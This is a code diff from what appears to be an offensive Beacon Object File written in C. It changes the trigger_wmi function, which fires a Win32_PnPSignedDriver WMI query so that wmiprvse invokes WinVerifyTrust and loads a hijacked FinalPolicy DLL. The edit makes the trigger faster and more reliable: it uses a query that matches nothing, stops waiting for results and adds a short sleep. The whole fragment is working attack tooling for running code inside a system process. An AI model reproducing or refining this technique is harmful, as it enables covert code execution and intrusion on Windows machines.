@@ -386,8 +386,11 @@ static void restore_finalpolicy(IWbemServices *pSvc, const char *guid, FP_BACKUP
  * load our hijacked FinalPolicy DLL.
  * ================================================================ */
 static BOOL trigger_wmi(IWbemServices *pSvc) {
+    /* Match sipexec.py: use WHERE DeviceName="null" (matches nothing, returns fast).
+     * The query just needs to FIRE inside wmiprvse to trigger WVT.
+     * Use RETURN_IMMEDIATELY -- don't wait for results. */
     BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
-    BSTR bstrQuery = OLEAUT32$SysAllocString(L"SELECT DeviceName FROM Win32_PnPSignedDriver WHERE DeviceName IS NOT NULL");
+    BSTR bstrQuery = OLEAUT32$SysAllocString(L"SELECT * FROM Win32_PnPSignedDriver WHERE DeviceName=\"null\"");
 
     IEnumWbemClassObject *pEnum = NULL;
     HRESULT hr = pSvc->ExecQuery(bstrWQL, bstrQuery,
@@ -401,22 +404,13 @@ static BOOL trigger_wmi(IWbemServices *pSvc) {
         return FALSE;
     }
 
-    /* Fetch at least one result to ensure WVT fires.
-     * Use 30s timeout -- if wmiprvse hangs (e.g. DLL blocks or crashes),
-     * we don't want the BOF to hang forever. */
-    IWbemClassObject *pObj = NULL;
-    ULONG uReturn = 0;
-    hr = pEnum->Next(30000, 1, &pObj, &uReturn);
-    if (pObj) pObj->Release();
-    pEnum->Release();
-
-    if (hr == WBEM_S_TIMEDOUT) {
-        TMB_WARN("WMI query timed out (30s) -- DLL may still have loaded via DllMain");
-    } else if (FAILED(hr)) {
-        TMB_WARN("WMI Next() returned 0x%08lx -- DLL may still have loaded via DllMain", hr);
-    }
+    /* Don't wait for results -- just let the query fire.
+     * wmiprvse processes it internally and calls WVT. */
+    if (pEnum) pEnum->Release();
 
     TMB_INFO("WMI trigger fired (Win32_PnPSignedDriver)");
+    /* Give wmiprvse time to process the query and call WVT */
+    KERNEL32$Sleep(3000);
     return TRUE;
 }
 
